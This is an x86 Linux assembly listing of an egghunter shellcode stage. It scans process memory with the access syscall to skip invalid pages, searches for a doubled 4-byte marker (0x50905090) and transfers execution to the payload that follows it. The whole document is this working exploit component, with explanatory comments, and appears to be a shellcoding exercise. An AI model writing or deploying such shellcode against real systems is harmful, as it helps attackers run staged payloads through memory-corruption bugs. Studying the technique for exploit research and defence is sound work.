section .text
    global _start

_start:
    mov ebx, 0x50905090     ; Load the Egg
    xor ecx, ecx            ; Clear ecx
    mul ecx                 ; Clear eax and edx (as a sideffect of multiplication)
next_page:
    or dx, 0xfff            ; Add 4096 (0x1000) to edx (page size)
next_byte:
    inc edx                 ;   in two steps
    pusha                   ; Save registers before syscall
    lea ebx, [edx+0x4]      ; Check if second 4 bytes are valid memory
    mov al, 0x21            ; Access syscall
    int 80h
    cmp al, 0xf2            ; 0xf2 is the value of the last byte of EFAULT return value
                            ; meaning the memory accessed wasn't valid
    popa                    ; Restore or registers
    jz next_page            ; The page wasn't valid; check if the next page is valid
    cmp [edx], ebx          ; If page is valid check first 4 bytes
    jnz next_byte           ; If first 4 bytes do not match, check the next byte, otherwise...
    cmp [edx+4], ebx        ; check second 4 bytes 
    jnz next_byte           ; If second 4 bytes do not match, check the next byte, otherwise...
    jmp edx                 ; The egg is found! Transfer the execution to the egg
